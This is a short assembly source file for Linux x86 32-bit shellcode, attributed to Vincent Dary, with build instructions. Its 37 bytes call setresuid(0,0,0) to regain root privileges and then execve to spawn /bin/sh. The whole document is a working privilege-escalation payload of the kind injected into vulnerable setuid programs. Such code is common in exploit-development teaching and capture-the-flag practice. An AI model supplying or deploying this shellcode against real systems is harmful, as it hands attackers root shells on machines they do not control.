;###############################################################################
;
; Date: May 18 2018
; Author: Vincent Dary
; File: setresuid_shellcode.asm
; Licence: GPLv3
;
; System: Linux
; Architectecture: Intel x86 32 bits
; Description: shellcode restore privileges
;                   - setresuid(0, 0, 0)
;                   - execve("/bin/sh", 0, 0)
;
; length: 37 bytes
; compile line: nasm setreuid_shellcode.asm
;
;###############################################################################

BITS 32

xor 	eax, eax
xor 	ebx, ebx
xor 	ecx, ecx
xor 	edx, edx
mov 	al, 0xd0
int 	0x80       ; setresuid(0, 0, 0)

xor 	eax, eax
mov 	al, 11
push 	ecx
push 	0x68732f2f
push 	0x6e69622f
mov 	ebx, esp
push 	ecx
mov 	edx, esp
push 	ebx
mov 	ecx,esp
int 	0x80       ; execve("/bin/sh", 0, 0)
